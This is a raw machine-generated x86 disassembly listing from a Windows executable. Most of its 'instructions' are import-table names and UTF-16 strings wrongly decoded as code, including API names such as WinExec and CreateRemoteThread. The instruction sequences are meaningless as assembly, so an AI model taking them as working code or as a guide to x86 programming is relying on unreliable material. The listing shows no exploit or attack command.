  4135e4:	outs   dx,BYTE PTR gs:[esi]
  4135e6:	inc    esi
  4135e7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x4300f200
  4135ef:	jb     0x413656
  4135f1:	popa   
  4135f2:	je     0x413659
  4135f4:	push   edi
  4135f5:	popa   
  4135f6:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  4135fe:	ins    DWORD PTR es:[edi],dx
  4135ff:	gs jb  0x413643
  413602:	add    BYTE PTR [eax],al
  413604:	and    al,0x3
  413606:	dec    ebp
  413607:	popa   
  413608:	jo     0x413660
  41360a:	imul   esp,DWORD PTR [ebp+0x77],0x6946664f
  413611:	ins    BYTE PTR es:[edi],dx
  413612:	add    BYTE PTR gs:[esp+eax*1],bh
  413616:	push   ebx
  413617:	gs je  0x41366e
  41361a:	push   0x64616572
  41361f:	push   eax
  413620:	jb     0x41368b
  413622:	outs   dx,DWORD PTR ds:[esi]
  413623:	jb     0x41368e
  413625:	je     0x4136a0
  413627:	add    BYTE PTR [edx+0x6f6c4702],dl
  41362d:	bound  esp,QWORD PTR [ecx+0x6c]
  413630:	inc    edi
  413631:	gs je  0x413675
  413634:	je     0x4136a5
  413636:	ins    DWORD PTR es:[edi],dx
  413637:	dec    esi
  413638:	popa   
  413639:	ins    DWORD PTR es:[edi],dx
  41363a:	gs push edi
  41363c:	add    BYTE PTR [eax],al
  41363e:	retf   
  41363f:	add    cl,BYTE PTR [ecx+0x73]
  413642:	inc    edx
  413643:	popa   
  413644:	fs push edx
  413646:	gs popa 
  413648:	fs push eax
  41364a:	je     0x4136be
  41364c:	add    BYTE PTR [eax],al
  41364e:	or     BYTE PTR [ecx],al
  413650:	inc    esp
  413651:	gs jbe 0x4136bd
  413654:	arpl   WORD PTR [ebp+0x49],sp
  413657:	outs   dx,DWORD PTR ds:[esi]
  413658:	inc    ebx
  413659:	outs   dx,DWORD PTR ds:[esi]
  41365a:	outs   dx,BYTE PTR ds:[esi]
  41365b:	je     0x4136cf
  41365d:	outs   dx,DWORD PTR ds:[esi]
  41365e:	ins    BYTE PTR es:[edi],dx
  41365f:	add    BYTE PTR [ecx+0x1],bl
  413662:	inc    esi
  413663:	imul   ebp,DWORD PTR [esi+0x64],0x736f6c43
  41366a:	add    BYTE PTR gs:[edx],cl
  41366d:	add    al,BYTE PTR [edi+0x65]
  413670:	je     0x4136bf
  413672:	outs   dx,DWORD PTR ds:[esi]
  413673:	fs jne 0x4136e2
  413676:	gs dec eax
  413678:	popa   
  413679:	outs   dx,BYTE PTR ds:[esi]
  41367a:	fs ins BYTE PTR es:[edi],dx
  41367c:	gs inc ecx
  41367e:	add    BYTE PTR [eax],al
  413680:	inc    edx
  413681:	add    DWORD PTR [esi+0x69],eax
  413684:	outs   dx,BYTE PTR ds:[esi]
  413685:	fs dec esi
  413687:	gs js  0x4136fe
  41368a:	inc    ebx
  41368b:	push   0x65676e61
  413690:	dec    esi
  413691:	outs   dx,DWORD PTR ds:[esi]
  413692:	je     0x4136fd
  413694:	imul   sp,WORD PTR [ebx+0x61],0x6974
  41369a:	outs   dx,DWORD PTR ds:[esi]
  41369b:	outs   dx,BYTE PTR ds:[esi]
  41369c:	add    BYTE PTR [eax],al
  41369e:	xor    eax,0x74655304
  4136a3:	push   esp
  4136a4:	push   0x64616572
  4136a9:	inc    ecx
  4136aa:	data16 imul bp,WORD PTR [esi+0x69],0x7974
  4136b1:	dec    ebp
  4136b2:	popa   
  4136b3:	jae    0x413720
  4136b5:	add    BYTE PTR [esi],bl
  4136b7:	add    al,BYTE PTR [edi+0x65]
  4136ba:	je     0x41370c
  4136bc:	jb     0x413727
  4136be:	outs   dx,DWORD PTR ds:[esi]
  4136bf:	jb     0x41372a
  4136c1:	je     0x41373c
  4136c3:	inc    ebx
  4136c4:	ins    BYTE PTR es:[edi],dx
  4136c5:	popa   
  4136c6:	jae    0x41373b
  4136c8:	add    BYTE PTR [eax],al
  4136ca:	sti    
  4136cb:	add    DWORD PTR [edi+0x65],eax
  4136ce:	je     0x41371c
  4136d0:	popa   
  4136d1:	jae    0x413747
  4136d3:	inc    ebp
  4136d4:	jb     0x413748
  4136d6:	outs   dx,DWORD PTR ds:[esi]
  4136d7:	jb     0x4136d9
  4136d9:	add    BYTE PTR [edi],dl
  4136db:	add    ecx,DWORD PTR [edi+ebp*2+0x63]
  4136df:	imul   eax,DWORD PTR [esi+0x69],0x6c
  4136e3:	add    BYTE PTR gs:[eax],al
  4136e6:	retf   
  4136e7:	add    DWORD PTR [edi+0x65],eax
  4136ea:	je     0x41372f
  4136ec:	jne    0x413760
  4136ee:	jb     0x413755
  4136f0:	outs   dx,BYTE PTR ds:[esi]
  4136f1:	je     0x413737
  4136f3:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  4136fa:	jns    0x413753
  4136fc:	add    BYTE PTR [eax],al
  4136fe:	mov    BYTE PTR [eax],al
  413700:	inc    ecx
  413701:	jb     0x413768
  413703:	inc    esi
  413704:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x41736970
  41370c:	dec    esi
  41370d:	push   ebx
  41370e:	dec    ecx
  41370f:	add    BYTE PTR ds:0x74655304,ah
  413715:	dec    ebp
  413716:	popa   
  413717:	imul   ebp,DWORD PTR [ebx+esi*2+0x6c],0x6e49746f
  41371f:	outs   dx,WORD PTR ds:[esi]
  413721:	add    dl,cl
  413723:	add    BYTE PTR [ebx+0x72],al
  413726:	gs popa 
  413728:	je     0x41378f
  41372a:	inc    ebp
  41372b:	jbe    0x413792
  41372d:	outs   dx,BYTE PTR ds:[esi]
  41372e:	je     0x413771
  413730:	add    BYTE PTR [eax],al
  413732:	outs   dx,BYTE PTR ds:[esi]
  413733:	add    DWORD PTR [esi+0x69],eax
  413736:	outs   dx,BYTE PTR ds:[esi]
  413737:	fs push edx
  413739:	gs jae 0x4137ab
  41373c:	jne    0x4137b0
  41373e:	arpl   WORD PTR [ebp+0x45],sp
  413741:	js     0x41379a
  413743:	add    BYTE PTR [eax+0x3],bh
  413746:	push   edx
  413747:	gs popa 
  413749:	fs inc esi
  41374b:	imul   ebp,DWORD PTR [ebp+eiz*2+0x0],0x47026100
  413753:	gs je  0x4137aa
  413756:	gs ins DWORD PTR es:[edi],dx
  413758:	jo     0x4137aa
  41375a:	popa   
  41375b:	je     0x4137c5
  41375d:	inc    ecx
  41375e:	add    BYTE PTR [eax],al
  413760:	mov    DWORD PTR [edx],eax
  413762:	inc    edi
  413763:	ins    BYTE PTR es:[edi],dx
  413764:	outs   dx,DWORD PTR ds:[esi]
  413765:	bound  esp,QWORD PTR [ecx+0x6c]
  413768:	inc    ecx
  413769:	ins    BYTE PTR es:[edi],dx
  41376a:	ins    BYTE PTR es:[edi],dx
  41376b:	outs   dx,DWORD PTR ds:[esi]
  41376c:	arpl   WORD PTR [eax],ax
  41376e:	xchg   esp,eax
  41376f:	add    al,0x57
  413771:	imul   ebp,DWORD PTR [esi+0x45],0x636578
  413778:	bound  eax,QWORD PTR [edx]
  41377a:	inc    edi
  41377b:	gs je  0x4137d2
  41377e:	gs ins DWORD PTR es:[edi],dx
  413780:	jo     0x4137d2
  413782:	popa   
  413783:	je     0x4137ed
  413785:	push   edi
  413786:	add    BYTE PTR [eax],al
  413788:	rol    BYTE PTR [eax],1
  41378a:	inc    ebx
  41378b:	jb     0x4137f2
  41378d:	popa   
  41378e:	je     0x4137f5
  413790:	inc    esi
  413791:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x47026700
  413799:	gs je  0x4137f0
  41379c:	push   0x64616572
  4137a1:	dec    esp
  4137a2:	outs   dx,DWORD PTR ds:[esi]
  4137a3:	arpl   WORD PTR [ecx+0x6c],sp
  4137a6:	add    BYTE PTR gs:[eax],ah
  4137a9:	add    DWORD PTR [ebp+0x6e],eax
  4137ac:	jne    0x41381b
  4137ae:	push   edx
  4137af:	gs jae 0x413821
  4137b2:	jne    0x413826
  4137b4:	arpl   WORD PTR [ebp+0x4e],sp
  4137b7:	popa   
  4137b8:	ins    DWORD PTR es:[edi],dx
  4137b9:	gs jae 0x4137fd
  4137bc:	add    BYTE PTR [eax],al
  4137be:	repz add DWORD PTR [edi+0x65],eax
  4137c2:	je     0x41380a
  4137c4:	jne    0x413832
  4137c6:	ins    BYTE PTR es:[edi],dx
  4137c7:	push   eax
  4137c8:	popa   
  4137c9:	je     0x413833
  4137cb:	dec    esi
  4137cc:	popa   
  4137cd:	ins    DWORD PTR es:[edi],dx
  4137ce:	gs push edi
  4137d0:	add    BYTE PTR [eax],al
  4137d2:	push   eax
  4137d3:	add    DWORD PTR [esi+0x69],eax
  4137d6:	ins    BYTE PTR es:[edi],dx
  4137d7:	gs push esp
  4137d9:	imul   ebp,DWORD PTR [ebp+0x65],0x79536f54
  4137e0:	jae    0x413856
  4137e2:	gs ins DWORD PTR es:[edi],dx
  4137e4:	push   esp
  4137e5:	imul   ebp,DWORD PTR [ebp+0x65],0xe60000
  4137ec:	inc    ebx
  4137ed:	jb     0x413854
  4137ef:	popa   
  4137f0:	je     0x413857
  4137f2:	push   edx
  4137f3:	gs ins DWORD PTR es:[edi],dx
  4137f5:	outs   dx,DWORD PTR ds:[esi]
  4137f6:	je     0x41385d
  4137f8:	push   esp
  4137f9:	push   0x64616572
  4137fe:	add    BYTE PTR [eax],al
  413800:	jns    0x413804
  413802:	inc    edi
  413803:	gs je  0x41385c
  413806:	gs jb  0x41387c
  413809:	imul   ebp,DWORD PTR [edi+0x6e],0x1010000
  413810:	inc    esp
  413811:	gs ins BYTE PTR es:[edi],dx
  413813:	gs je  0x41387b
  413816:	inc    ebx
  413817:	jb     0x413882
  413819:	je     0x413884
  41381b:	arpl   WORD PTR [ecx+0x6c],sp
  41381e:	push   ebx
  41381f:	arpl   WORD PTR gs:[ecx+ebp*2+0x6f],si
  413824:	outs   dx,BYTE PTR ds:[esi]
  413825:	add    BYTE PTR [ecx],cl
  413827:	add    al,BYTE PTR [edi+0x65]
  41382a:	je     0x413879
  41382c:	outs   dx,DWORD PTR ds:[esi]
  41382d:	fs jne 0x41389c
  413830:	gs inc esi
  413832:	imul   ebp,DWORD PTR [ebp+eiz*2+0x4e],0x57656d61
  41383a:	add    BYTE PTR [eax],al
  41383c:	dec    edi
  41383d:	add    al,0x53
  41383f:	jne    0x4138b4
  413841:	jo     0x4138a8
  413843:	outs   dx,BYTE PTR ds:[esi]
  413844:	fs push esp
  413846:	push   0x64616572
  41384b:	add    ah,cl
  41384d:	add    al,0x6c
  41384f:	jae    0x4138c5
  413851:	jb     0x4138b6
  413853:	jo     0x4138ce
  413855:	outs   dx,BYTE PTR ds:[esi]
  413856:	push   edi
  413857:	add    bh,dh
  413859:	add    DWORD PTR [edi+0x65],eax
  41385c:	je     0x4138a6
  41385e:	popa   
  41385f:	outs   dx,BYTE PTR ds:[esi]
  413860:	fs ins BYTE PTR es:[edi],dx
  413862:	gs dec ecx
  413864:	outs   dx,BYTE PTR ds:[esi]
  413865:	outs   dx,WORD PTR ds:[esi]
  413867:	jb     0x4138d6
  413869:	popa   
  41386a:	je     0x4138d5
  41386c:	outs   dx,DWORD PTR ds:[esi]
  41386d:	outs   dx,BYTE PTR ds:[esi]
  41386e:	add    BYTE PTR [eax],al
  413870:	or     eax,DWORD PTR [ebx]
  413872:	dec    esp
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	arpl   WORD PTR [ecx+0x6c],sp
  413877:	inc    ecx
  413878:	ins    BYTE PTR es:[edi],dx
  413879:	ins    BYTE PTR es:[edi],dx
  41387a:	outs   dx,DWORD PTR ds:[esi]
  41387b:	arpl   WORD PTR [eax],ax
  41387d:	add    BYTE PTR [ebx+0x2],ah
  413880:	inc    edi
  413881:	gs je  0x4138d8
  413884:	push   0x64616572
  413889:	inc    ebx
  41388a:	outs   dx,DWORD PTR ds:[esi]
  41388b:	outs   dx,BYTE PTR ds:[esi]
  41388c:	je     0x4138f3
  41388e:	js     0x413904
  413890:	add    BYTE PTR [eax],al
  413892:	ret    
  413893:	add    edx,DWORD PTR [edx+0x74]
  413896:	ins    BYTE PTR es:[edi],dx
  413897:	push   ebp
  413898:	outs   dx,BYTE PTR ds:[esi]
  413899:	ja     0x413904
  41389b:	outs   dx,BYTE PTR ds:[esi]
  41389c:	add    BYTE PTR fs:[ecx+eax*1+0x41746547],cl
  4138a4:	je     0x413915
  4138a6:	ins    DWORD PTR es:[edi],dx
  4138a7:	dec    esi
  4138a8:	popa   
  4138a9:	ins    DWORD PTR es:[edi],dx
  4138aa:	gs push edi
  4138ac:	add    BYTE PTR [eax],al
  4138ae:	jmp    0x6946:0x74654701
  4138b5:	ins    BYTE PTR es:[edi],dx
  4138b6:	gs inc ecx
  4138b8:	je     0x41392e
  4138ba:	jb     0x413925
  4138bc:	bound  esi,QWORD PTR [ebp+0x74]
  4138bf:	gs jae 0x413907
  4138c2:	js     0x413905
  4138c4:	add    BYTE PTR [eax],al
  4138c6:	inc    edx
  4138c7:	add    al,BYTE PTR [edi+0x65]
  4138ca:	je     0x41391f
  4138cc:	push   0x5074726f
  4138d1:	popa   
  4138d2:	je     0x41393c
  4138d4:	dec    esi
  4138d5:	popa   
  4138d6:	ins    DWORD PTR es:[edi],dx
  4138d7:	gs inc ecx
  4138d9:	add    bl,bl
  4138db:	add    edx,DWORD PTR [ebx+0x65]
  4138de:	popa   
  4138df:	jb     0x413944
  4138e1:	push   0x68746150
  4138e6:	inc    ecx
  4138e7:	add    BYTE PTR [eax+0x4],al
  4138ea:	push   ebx
  4138eb:	gs je  0x413942
  4138ee:	imul   ebp,DWORD PTR [ebp+0x65],0x65755172
  4138f5:	jne    0x41395c
  4138f7:	push   esp
  4138f8:	imul   ebp,DWORD PTR [ebp+0x65],0xb4000072
  4138ff:	add    edx,DWORD PTR [edx+0x65]
  413902:	ins    DWORD PTR es:[edi],dx
  413903:	outs   dx,DWORD PTR ds:[esi]
  413904:	jbe    0x41396b
  413906:	inc    esp
  413907:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  41390e:	jns    0x413967
  413910:	add    BYTE PTR [eax],al
  413912:	ret    
  413913:	add    al,0x6c
  413915:	jae    0x41398b
  413917:	jb     0x41397c
  413919:	ins    DWORD PTR es:[edi],dx
  41391a:	jo     0x413973
  41391c:	add    BYTE PTR [eax],al
  41391e:	dec    edi
  41391f:	add    DWORD PTR [esi+0x69],eax
  413922:	ins    BYTE PTR es:[edi],dx
  413923:	gs push esp
  413925:	imul   ebp,DWORD PTR [ebp+0x65],0x6f4c6f54
  41392c:	arpl   WORD PTR [ecx+0x6c],sp
  41392f:	inc    esi
  413930:	imul   ebp,DWORD PTR [ebp+eiz*2+0x54],0x656d69
  413938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413939:	add    BYTE PTR [ebx+0x61],al
  41393c:	outs   dx,BYTE PTR ds:[esi]
  41393d:	arpl   WORD PTR [ebp+0x6c],sp
  413940:	push   edi
  413941:	popa   
  413942:	imul   esi,DWORD PTR [ecx+eiz*2+0x62],0x6954656c
  41394a:	ins    DWORD PTR es:[edi],dx
  41394b:	gs jb  0x41394e
  41394e:	dec    ebx
  41394f:	inc    ebp
  413950:	push   edx
  413951:	dec    esi
  413952:	inc    ebp
  413953:	dec    esp
  413954:	xor    esi,DWORD PTR [edx]
  413956:	cs fs ins BYTE PTR es:[edi],dx
  413959:	ins    BYTE PTR es:[edi],dx
  41395a:	add    BYTE PTR [eax],al
  41395c:	inc    esi
  41395d:	add    BYTE PTR [eax+0x61],dl
  413960:	je     0x4139ca
  413962:	inc    esi
  413963:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  41396a:	outs   dx,BYTE PTR ds:[esi]
  41396b:	jae    0x4139d6
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	outs   dx,BYTE PTR ds:[esi]
  41396f:	inc    ecx
  413970:	add    BYTE PTR [eax],al
  413972:	inc    edi
  413973:	add    BYTE PTR [eax+0x61],dl
  413976:	je     0x4139e0
  413978:	inc    esi
  413979:	imul   ebp,DWORD PTR [esi+0x64],0x65747845
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	jae    0x4139ec
  413983:	outs   dx,DWORD PTR ds:[esi]
  413984:	outs   dx,BYTE PTR ds:[esi]
  413985:	push   edi
  413986:	add    BYTE PTR [eax],al
  413988:	push   ebx
  413989:	dec    eax
  41398a:	dec    esp
  41398b:	push   edi
  41398c:	inc    ecx
  41398d:	push   eax
  41398e:	dec    ecx
  41398f:	cs fs ins BYTE PTR es:[edi],dx
  413992:	ins    BYTE PTR es:[edi],dx
  413993:	add    BYTE PTR [ebx+0x46],dh
  413996:	addr16 popa 
  413998:	pop    ecx
  413999:	dec    ebp
  41399a:	popa   
  41399b:	jns    0x4139f1
  41399d:	push   ecx
  41399e:	imul   ebp,DWORD PTR [ebx+0x74],0x78
  4139a2:	je     0x413a05
  4139a4:	inc    ebx
  4139a5:	push   ecx
  4139a6:	ins    BYTE PTR es:[edi],dx
  4139a7:	pop    eax
  4139a8:	add    BYTE PTR [eax],al
  4139aa:	add    BYTE PTR [eax],al
  4139ac:	or     al,0x3e
  4139ae:	inc    ecx
  4139af:	add    BYTE PTR [esi+edi*1],dl
  4139b2:	inc    ecx
  4139b3:	add    ah,dh
  4139b5:	cmp    eax,DWORD PTR [ecx+0x0]
  4139b8:	call   0x794febc8
  4139bd:	dec    edi
  4139be:	ret    0x774e
  4139c1:	dec    edi
  4139c2:	cmp    eax,0x384f4f4f
  4139c7:	dec    edi
  4139c8:	jp     0x413a19
  4139ca:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139cd:	dec    edi
  4139ce:	ss dec edi
  4139d0:	add    ecx,DWORD PTR [edi+0x31]
  4139d3:	dec    edi
  4139d4:	ret    0x324e
  4139d7:	dec    edi
  4139d8:	push   ds
  4139d9:	push   edx
  4139da:	pop    ds
  4139db:	push   ebx
  4139dc:	cmp    DWORD PTR [edi+0x79],ecx
  4139df:	dec    edi
  4139e0:	ret    0x774e
  4139e3:	dec    edi
  4139e4:	cmp    eax,0x384f4f4f
  4139e9:	dec    edi
  4139ea:	jp     0x413a3b
  4139ec:	cmp    ecx,DWORD PTR [edi+0x5e]
  4139ef:	dec    edi
  4139f0:	ss dec edi
  4139f2:	imul   ecx,DWORD PTR [edi+0x31],0x324ec24f
  4139f9:	dec    edi
  4139fa:	push   ds
  4139fb:	bound  ebx,QWORD PTR [edi]
  4139fd:	arpl   WORD PTR [ecx],di
  4139ff:	dec    edi
  413a00:	jns    0x413a51
  413a02:	ret    0x724e
  413a05:	dec    edi
  413a06:	cmp    eax,0x394f034f
  413a0b:	dec    edi
  413a0c:	dec    esp
  413a0d:	dec    edi
  413a0e:	xor    al,0x4f
  413a10:	ret    0x304e
  413a13:	dec    edi
  413a14:	push   ds
  413a15:	jb     0x413a36
  413a17:	jae    0x413a28
  413a19:	or     DWORD PTR [eax],0xffffff80
  413a1c:	js     0x4139ae
  413a1e:	jns    0x4139b1
  413a20:	aas    
  413a21:	dec    edi
  413a22:	jbe    0x413a73
  413a24:	ret    0x764e
  413a27:	dec    edi
  413a28:	ds dec edi
  413a2a:	dec    esp
  413a2b:	dec    edi
  413a2c:	cmp    DWORD PTR [edi+0x3],ecx
  413a2f:	dec    edi
  413a30:	xor    eax,0x364ec24f
  413a35:	dec    edi
  413a36:	push   ds
  413a37:	sbb    BYTE PTR [edi],0x83
  413a3a:	setae  BYTE PTR [eax]
  413a3d:	nop
  413a3e:	js     0x4139e0
  413a40:	jns    0x4139e3
  413a42:	aas    
  413a43:	dec    edi
  413a44:	jbe    0x413a95
  413a46:	ret    0x764e
  413a49:	dec    edi
  413a4a:	ds dec edi
  413a4c:	dec    esp
  413a4d:	dec    edi
  413a4e:	cmp    DWORD PTR [edi+0x69],ecx
  413a51:	dec    edi
  413a52:	xor    eax,0x364ec24f
  413a57:	dec    edi
  413a58:	push   ds
  413a59:	xchg   edx,eax
  413a5a:	pop    ds
  413a5b:	xchg   ebx,eax
  413a5c:	bt     DWORD PTR [eax],ecx
  413a5f:	mov    al,ds:0xb179b078
  413a64:	aas    
  413a65:	dec    edi
  413a66:	push   0x4e4ec24f
  413a6b:	dec    edi
  413a6c:	cmp    eax,0x394f034f
  413a71:	dec    edi
  413a72:	push   ecx
  413a73:	dec    edi
  413a74:	xor    al,0x4f
  413a76:	ret    0x364e
  413a79:	dec    edi
  413a7a:	push   ds
  413a7b:	mov    ds:0xb30fa31f,al
  413a80:	or     BYTE PTR [eax-0x3e863f88],dh
  413a86:	aas    
  413a87:	dec    edi
  413a88:	push   0x4e4ec24f
  413a8d:	dec    edi
  413a8e:	cmp    eax,0x394f784f
  413a93:	dec    edi
  413a94:	pop    edi
  413a95:	dec    edi
  413a96:	cmp    ecx,DWORD PTR [edi-0x3e]
  413a99:	dec    esi
  413a9a:	xor    eax,0x1fb21e4f
  413a9f:	mov    bl,0xf
  413aa1:	ret    
  413aa2:	or     al,al
  413aa4:	js     0x413a76
  413aa6:	jns    0x413a79
  413aa8:	aas    
  413aa9:	dec    edi
  413aaa:	push   0x4e4ec24f
  413aaf:	dec    edi
  413ab0:	cmp    eax,0x394f724f
  413ab5:	dec    edi
  413ab6:	dec    esi
  413ab7:	dec    edi
  413ab8:	xor    al,0x4f
  413aba:	ret    0x304e
  413abd:	dec    edi
  413abe:	push   ds
  413abf:	ret    0xc31f
  413ac2:	psrlq  mm1,QWORD PTR [eax]
  413ac5:	sar    BYTE PTR [eax-0x20],1
  413ac8:	jns    0x413aab
  413aca:	aas    
  413acb:	dec    edi
  413acc:	push   0x4e4ec24f
  413ad1:	dec    edi
  413ad2:	cmp    eax,0x394f734f
  413ad7:	dec    edi
  413ad8:	dec    esp
  413ad9:	dec    edi
  413ada:	xor    al,0x4f
  413adc:	ret    0x364e
  413adf:	dec    edi
  413ae0:	push   ds
  413ae1:	rcr    BYTE PTR [edi],cl
  413ae3:	ror    DWORD PTR [edi],cl
  413ae5:	jecxz  0x413aef
  413ae7:	loopne 0x413b61
  413ae9:	lock jns 0x413add
  413aec:	aas    
  413aed:	dec    edi
  413aee:	ins    DWORD PTR es:[edi],dx
  413aef:	dec    edi
  413af0:	ret    0x5f4e
  413af3:	dec    edi
  413af4:	cmp    eax,0x3e4f524f
  413af9:	dec    edi
  413afa:	ret    0x3f4e
  413afd:	dec    edi
  413afe:	push   ds
  413aff:	loop   0x413b20
  413b01:	jecxz  0x413b12
  413b03:	repz or al,dh
  413b06:	js     0x413b08
  413b08:	jns    0x413b0b
  413b0a:	js     0x413b1c
  413b0c:	jns    0x413b1f
  413b0e:	ds dec edi
  413b10:	jg     0x413b61
  413b12:	ret    0x5b4e
  413b15:	dec    edi
  413b16:	cmp    al,0x4f
  413b18:	jb     0x413b69
  413b1a:	ds dec edi
  413b1c:	dec    ebp
  413b1d:	dec    edi
  413b1e:	cmp    ecx,DWORD PTR [edi-0x3e]
  413b21:	dec    esi
  413b22:	xor    eax,0x1f021e4f
  413b27:	add    ecx,DWORD PTR [edi]
  413b29:	adc    ecx,DWORD PTR [eax]
  413b2b:	adc    BYTE PTR [eax+0x20],bh
  413b2e:	jns    0x413b51
  413b30:	aas    
  413b31:	dec    edi
  413b32:	add    BYTE PTR [eax],al
  413b34:	mov    esp,0xb0004139
  413b39:	cmp    eax,DWORD PTR [ecx+0x0]
  413b3c:	mov    eax,0x1800413b
  413b41:	ds inc ecx
  413b43:	add    BYTE PTR [ebp+edi*1+0x41],bh
  413b47:	add    BYTE PTR [eax],cl
  413b49:	ds inc ecx
  413b4b:	add    BYTE PTR [eax-0x63ffbec5],bl
  413b51:	cmp    eax,DWORD PTR [ecx+0x0]
  413b54:	add    BYTE PTR [esi],bh
  413b56:	inc    ecx
  413b57:	add    BYTE PTR [eax],al
  413b59:	cmp    al,0x41
  413b5b:	add    BYTE PTR [edx-0x4e076357],cl
  413b61:	mov    edx,0x3bb4f89c
  413b66:	inc    ecx
  413b67:	add    BYTE PTR [eax],bh
  413b69:	cmp    eax,0x3d4c0041
  413b6e:	inc    ecx
  413b6f:	add    BYTE PTR [eax+0x3d],bl
  413b72:	inc    ecx
  413b73:	add    BYTE PTR [eax+0x3d],ch
  413b76:	inc    ecx
  413b77:	add    ah,ch
  413b79:	cmp    eax,DWORD PTR [ecx+0x0]
  413b7c:	mov    eax,0xc004139
  413b81:	cmp    al,0x41
  413b83:	add    ah,bh
  413b85:	cmp    eax,DWORD PTR [ecx+0x0]
  413b88:	sbb    al,0x3e
  413b8a:	inc    ecx
  413b8b:	add    BYTE PTR [ecx],dh
  413b8d:	test   DWORD PTR [eax+edi*8-0x7ee8f462],ebx
  413b94:	sar    BYTE PTR [ebx],0x41
  413b97:	add    BYTE PTR [ebx-0x707ee9e4],dl
  413b9d:	or     eax,0x705
  413ba2:	inc    eax
  413ba3:	add    BYTE PTR [ebp+ebx*8-0x6c],al
  413ba7:	fnsave [edi+0x37]
  413baa:	inc    ebx
  413bab:	add    BYTE PTR [edx+0x68],dh
  413bae:	inc    ebp
  413baf:	inc    ecx
  413bb0:	(bad)  
  413bb1:	cli    
  413bb2:	jne    0x413c16
  413bb4:	(bad)  
  413bb5:	in     eax,dx
  413bb6:	inc    BYTE PTR [edi]
  413bb8:	mov    eax,0xa805a3fa
  413bbd:	cmp    eax,DWORD PTR [ecx+0x0]
  413bc0:	xor    dl,BYTE PTR [ebp-0x69cd0764]
  413bc6:	pushf  
  413bc7:	clc    
  413bc8:	xor    edx,DWORD PTR [ebp-0x6ac30764]
  413bce:	pushf  
  413bcf:	clc    
  413bd0:	cmp    eax,0x3ef89c95
  413bd5:	xchg   ebp,eax
  413bd6:	pushf  
  413bd7:	clc    
  413bd8:	aas    
  413bd9:	xchg   ebp,eax
  413bda:	pushf  
  413bdb:	clc    
  413bdc:	cmp    BYTE PTR [ebp-0x6ac60764],dl
  413be2:	pushf  
  413be3:	clc    
  413be4:	cmp    dl,BYTE PTR [ebp-0x6ade0764]
  413bea:	pushf  
  413beb:	clc    
  413bec:	in     eax,dx
  413bed:	stc    
  413bee:	add    esp,DWORD PTR [eax-0x50]
  413bf1:	cmp    DWORD PTR [ecx+0x0],eax
  413bf4:	hlt    
  413bf5:	add    DWORD PTR [ebx+0x0],eax
  413bf8:	pop    ecx
  413bf9:	dec    ecx
  413bfa:	imul   si,WORD PTR [ecx],0xff85
  413bfe:	pushf  
  413bff:	clc    
  413c00:	sahf   
  413c01:	jmp    0x4f04356
  413c06:	add    BYTE PTR [eax],al
  413c08:	lods   al,BYTE PTR ds:[esi]
  413c09:	cmp    DWORD PTR [ecx+0x0],eax
  413c0c:	pushf  
  413c0d:	or     eax,DWORD PTR [esi+ecx*1]
	...
  413c40:	addr16 jg 0x413c83
  413c43:	add    BYTE PTR [edx+0x12],ch
  413c46:	inc    ebx
  413c47:	add    BYTE PTR [eax],al
  413c49:	add    BYTE PTR [eax],al
  413c4b:	add    BYTE PTR [eax+eax*1+0x46],al
  413c4f:	add    BYTE PTR [ecx+0x0],ch
  413c52:	outs   dx,DWORD PTR ds:[esi]
  413c53:	add    BYTE PTR [edx+0x0],cl
  413c56:	dec    ecx
  413c57:	add    BYTE PTR [eax+eax*1+0x46],al
  413c5b:	add    BYTE PTR [eax+eax*1+0x49],cl
  413c5f:	add    BYTE PTR [ebp+0x0],dl
  413c62:	inc    esi
  413c63:	add    BYTE PTR [edi+0x0],cl
  413c66:	imul   eax,DWORD PTR [eax],0x6f
  413c69:	add    BYTE PTR [edx+0x0],ch
  413c6c:	dec    ebx
  413c6d:	add    BYTE PTR [eax+eax*1+0x66],cl
  413c71:	add    BYTE PTR [edx+0x0],ch
  413c74:	imul   eax,DWORD PTR [eax],0x46006f
  413c7a:	jo     0x413c7c
  413c7c:	outs   dx,DWORD PTR ds:[esi]
  413c7d:	add    BYTE PTR [ebx+0x0],ch
  413c80:	ins    DWORD PTR es:[edi],dx
  413c81:	add    BYTE PTR [eax+eax*1+0x6b],ah
  413c85:	add    BYTE PTR [ebx+0x0],dh
  413c88:	ins    BYTE PTR es:[edi],dx
  413c89:	add    BYTE PTR [edx+0x0],ch
  413c8c:	data16 add BYTE PTR [edi+0x0],ah
  413c90:	imul   eax,DWORD PTR [eax],0x64006f
  413c96:	add    BYTE PTR [di+0x0],dh
  413c9a:	imul   eax,DWORD PTR [eax],0x69006a
  413ca0:	outs   dx,DWORD PTR ds:[esi]
  413ca1:	add    BYTE PTR [esi+0x0],ah
  413ca4:	add    BYTE PTR fs:[ebp+0x0],dh
  413ca8:	push   0x0
  413caa:	add    BYTE PTR [bp+0x0],ah
  413cae:	add    BYTE PTR fs:[eax],al
  413cb1:	add    BYTE PTR [eax],al
  413cb3:	add    BYTE PTR [edx+0x0],cl
  413cb6:	inc    esp
  413cb7:	add    BYTE PTR [ebx+0x0],cl
  413cba:	dec    edx
  413cbb:	add    BYTE PTR [edx+0x0],ch
  413cbe:	imul   eax,DWORD PTR [eax],0x64
  413cc1:	add    BYTE PTR [ebx+0x0],cl
  413cc4:	dec    esp
  413cc5:	add    BYTE PTR [edx+0x0],cl
  413cc8:	add    BYTE PTR fs:[ecx+0x0],ch
  413ccc:	ins    BYTE PTR es:[edi],dx
  413ccd:	add    BYTE PTR [edx+0x0],cl
  413cd0:	ins    BYTE PTR es:[edi],dx
  413cd1:	add    BYTE PTR [ebx+0x0],ch
  413cd4:	add    BYTE PTR fs:[edx+0x0],ch
  413cd8:	dec    esp
  413cd9:	add    BYTE PTR [ebp+0x0],dl
  413cdc:	inc    esp
  413cdd:	add    BYTE PTR [edi+0x0],ch
  413ce0:	imul   eax,DWORD PTR [eax],0x73006c
  413ce6:	push   0x0
